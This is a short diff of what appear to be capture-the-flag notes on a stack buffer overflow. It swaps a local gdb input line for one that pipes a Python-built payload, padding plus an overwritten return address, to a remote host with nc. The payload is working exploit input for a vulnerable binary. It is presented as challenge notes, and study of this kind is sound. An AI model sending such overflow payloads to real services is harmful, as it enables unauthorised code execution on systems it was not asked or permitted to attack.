@@ -12,7 +12,7 @@ run <<< $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08" + "\x43" * 4 + "\xef\
 ##### execute remotely, string as text input
 ###### bash
 ```bash
-run <<< $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08" + "\x43" * 4 + "\xef\xbe\xad\xde"+ "\x0d\xd0\xde\xc0" )')
+echo $(python -c 'print(188*"\x41" + "\xe2\x91\x04\x08")') | nc 123.123.123.123 32123
 ```
 ###### pwntools
 ```bash
